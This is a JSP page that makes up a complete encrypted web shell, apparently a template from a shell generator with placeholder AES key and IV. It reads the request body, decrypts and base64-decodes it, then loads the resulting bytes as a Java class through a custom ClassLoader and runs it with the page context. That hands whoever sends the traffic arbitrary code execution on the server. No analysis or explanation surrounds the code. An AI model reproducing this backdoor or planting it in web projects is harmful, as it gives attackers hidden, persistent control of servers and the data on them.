<%@ page import="java.io.BufferedReader" %>
<%@ page import="javax.crypto.SecretKey" %>
<%@ page import="javax.crypto.spec.SecretKeySpec" %>
<%@ page import="javax.crypto.spec.IvParameterSpec" %>
<%@ page import="java.security.spec.AlgorithmParameterSpec" %>
<%@ page import="javax.crypto.Cipher" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%!
    class U extends ClassLoader{
        U(ClassLoader c){
            super(c);
        }

        public Class g(byte []b){
            return super.defineClass(b,0,b.length);
        }
    }

    public static String decrypt(final String encrypted) {
        try {
            SecretKey key = new SecretKeySpec("[key_placeholder]".getBytes(), "AES");
            AlgorithmParameterSpec iv = new IvParameterSpec("[iv_placeholder]".getBytes());
            byte[] decodeBase64 = new sun.misc.BASE64Decoder().decodeBuffer(encrypted);
            // 指定加密的算法、工作模式和填充方式
            Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
            cipher.init(Cipher.DECRYPT_MODE, key, iv);
            return new String(cipher.doFinal(decodeBase64), "UTF-8");
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }
%>
<%
    String wholeStr = request.getReader().readLine();
    if(wholeStr != null && !wholeStr.trim().equals("")) {
        wholeStr = decrypt(wholeStr);
        new U(this.getClass().getClassLoader()).g(new sun.misc.BASE64Decoder().decodeBuffer(wholeStr)).newInstance().equals(pageContext);
    }
%>